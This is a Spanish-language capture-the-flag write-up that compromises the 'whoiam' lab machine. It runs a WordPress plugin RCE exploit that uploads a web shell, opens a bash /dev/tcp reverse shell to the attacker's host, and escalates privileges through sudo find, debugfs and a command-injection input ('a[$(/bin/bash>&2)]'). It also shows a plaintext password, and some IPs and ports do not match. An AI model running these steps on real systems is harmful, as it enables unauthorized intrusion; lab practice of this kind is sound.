@@ -1,1 +1,220 @@
 Resolucion de la maquina whoiam
+Para comenzar, se realiza un ping a la maquina vulnerable, para tener la certeza de que se realizo la conexion exitosa
+└─$ ping -c3 172.17.0.2  
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.064 ms
+64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.085 ms
+64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.086 ms
+
+--- 172.17.0.2 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2032ms
+rtt min/avg/max/mdev = 0.064/0.078/0.086/0.010 ms
+
+Al recibir informacion, se comienza con un escaneo de puertos con nmap
+└─$ nmap -p- -sS -sC -sV --min-rate 1000 172.17.0.2  
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 19:47 -0600
+Nmap scan report for 172.17.0.2
+Host is up (0.0000040s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-generator: WordPress 6.5.4
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Whoiam
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
+
+Veo que hay un puerto, el puerto 80 asi que busco la pagina para ver si encuentro algo interesante, sin embargo no encuentro nada interesante, por lo que usare gobuster para encontrar directorios ocultos
+└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html,php,txt -t 200
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htaccess            (Status: 403) [Size: 275]
+.htaccess.txt        (Status: 403) [Size: 275]
+.htaccess.html       (Status: 403) [Size: 275]
+.htpasswd.php        (Status: 403) [Size: 275]
+.htpasswd.txt        (Status: 403) [Size: 275]
+.hta.html            (Status: 403) [Size: 275]
+.htpasswd.html       (Status: 403) [Size: 275]
+backups              (Status: 301) [Size: 310] [--> http://172.17.0.2/backups/]
+.htpasswd            (Status: 403) [Size: 275]
+.hta.php             (Status: 403) [Size: 275]
+.hta.txt             (Status: 403) [Size: 275]
+.htaccess.php        (Status: 403) [Size: 275]
+license.txt          (Status: 200) [Size: 19903]
+index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/]
+index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/]
+readme.html          (Status: 200) [Size: 7425]
+server-status        (Status: 403) [Size: 275]
+.hta                 (Status: 403) [Size: 275]
+wp-admin             (Status: 301) [Size: 311] [--> http://172.17.0.2/wp-admin/]
+wp-content           (Status: 301) [Size: 313] [--> http://172.17.0.2/wp-content/]
+wp-includes          (Status: 301) [Size: 314] [--> http://172.17.0.2/wp-includes/]
+wp-settings.php      (Status: 500) [Size: 0]
+wp-links-opml.php    (Status: 200) [Size: 219]
+wp-load.php          (Status: 200) [Size: 0]
+wp-cron.php          (Status: 200) [Size: 0]
+wp-login.php         (Status: 200) [Size: 4576]
+wp-blog-header.php   (Status: 200) [Size: 0]
+wp-trackback.php     (Status: 200) [Size: 135]
+wp-config.php        (Status: 200) [Size: 0]
+wp-mail.php          (Status: 403) [Size: 2520]
+wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wp-login.php?action=register]
+xmlrpc.php           (Status: 405) [Size: 42]
+xmlrpc.php           (Status: 405) [Size: 42]
+Progress: 19000 / 19000 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Encuentro cosas importantes, como un action register, adminy backups, asi que inspecciono un poco cada opcion disponible
+
+1- Al ingresar a /backups/ encuentro un .zip, que al ingresar e inspeccionar, encentro un usuario y posiblemente una contrasena
+Quiero descartar si es que la contrasena esta cifrada e intento en CyberChef si es que esta cifrada
+
+2- EL archivo php, me lleva a un login, asi que intento acceder con las credenciales que encontre con anterioridad y acceso con las credenciales ya encontradas
+Encuentro al usuario erik y developer
+Pero no puedo llegar mas alla, ni mucho menos crear una shell asi que busco un exploit 
+
+└─$ wpscan -e p,vt,cb,u --url 172.17.0.2
+Y encuentro esto
+i] Plugin(s) Identified:
+
+[+] *
+ | Location: http://172.17.0.2/wp-content/plugins/*/
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] modern-events-calendar-lite
+ | Location: http://172.17.0.2/wp-content/plugins/modern-events-calendar-lite/
+ | Last Updated: 2022-05-10T21:06:00.000Z
+ | [!] The version is out of date, the latest version is 6.5.6
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 5.16.2 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://172.17.0.2/wp-content/plugins/modern-events-calendar-lite/readme.txt
+ | Confirmed By: Change Log (Aggressive Detection)
+ |  - http://172.17.0.2/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'
+
+Asi que busco un exploit y encuentra lo siguiente
+└─$ searchsploit modern-events-calendar-lite 5.16.2
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (Unauthenticated)                                                                                                                           | php/webapps/50084.py
+Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)                                                                                                                    | php/webapps/50082.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+
+Ahora solo se debe descargar y guardar
+└─$ searchsploit -m php/webapps/50082.py
+  Exploit: Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)
+      URL: https://www.exploit-db.com/exploits/50082
+     Path: /usr/share/exploitdb/exploits/php/webapps/50082.py
+    Codes: CVE-2021-24145
+ Verified: False
+File Type: ASCII text, with very long lines (18082)
+Copied to: /home/jogu/50082.py
+
+Con la credencial anteriormente encontrada escribo
+python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
+
+Ejecuto
+└─$ python 50082.py -T 172.17.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
+[+] Authentication successfull !
+
+[+] Shell Uploaded to: http://172.17.0.2:80//wp-content/uploads/shell.php
+Por lo que ahora puedo ingresar con ese nuevo php
+
+Me muestra una shell en la pagina y comienzo con la inspeccion
+Primero un whoami
+Despues un sudo -l para ver binarios y encontrar una posible forma de ser root
+
+p0wny@shell:â¦/wp-content/uploads# sudo -l
+Matching Defaults entries for www-data on c222164705c1:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User www-data may run the following commands on c222164705c1:
+    (rafa) NOPASSWD: /usr/bin/find
+
+Busco en GTFOBins si existe algun comando con find para ser root y aunque se intenta no se puede ejecutar, por lo que hago una reverse shell con netcat para el puerto 4444 con
+bash -c 'bash -i >& /dev/tcp/172.18.0.1/443 0>&1'
+
+Mientras tanto en la terminal escribimos nc -lvnp 443
+└─$ nc -lvnp 443 
+listening on [any] 443 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 50106
+bash: cannot set terminal process group (24): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@c222164705c1:/var/www/html/wp-content/uploads$ 
+
+Ahora se have un tratamiento TTY
+Despues aplicamos un sudo -l de nuevo y vemos lo siguiente
+www-data@c222164705c1:/var/www/html/wp-content/uploads$ sudo -l
+Matching Defaults entries for www-data on c222164705c1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on c222164705c1:
+    (rafa) NOPASSWD: /usr/bin/find
+Asi que ejecuto el comando que encontre sobre find con rafa
+
+La terminal ahora arroja error, pero al escribir de nuevo sudo -l cambia el archivo para root
+$ sudo -l
+Matching Defaults entries for rafa on c222164705c1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User rafa may run the following commands on c222164705c1:
+    (ruben) NOPASSWD: /usr/sbin/debugfs
+
+Busco de nuevo en GTFOBIns y encuentro lo siguiente
+sudo debugfs
+!/bin/sh
+
+y aplico
+sudo -u ruben debugfs
+!/bin/sh
+
+$ sudo -u ruben debugfs
+!/bin/sh!/bin/shdebugfs 1.47.0 (5-Feb-2023)
+debugfs:  !/bin/sh
+$ sudo -l
+Matching Defaults entries for ruben on c222164705c1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User ruben may run the following commands on c222164705c1:
+    (ALL) NOPASSWD: /bin/bash /opt/penguin.sh
+
+Y ahora si se puede usar el binario para ser root, con lo siguiente
+sudo /bin/bash /opt/penguin.sh
+
+Y pedira un guess, que basta con escribir 
+a[$(/bin/bash>&2)]
+
+Y con ello somos root
+root@c222164705c1:/var/www/html/wp-content/uploads# whoami
+root
+root@c222164705c1:/var/www/html/wp-content/uploads# 
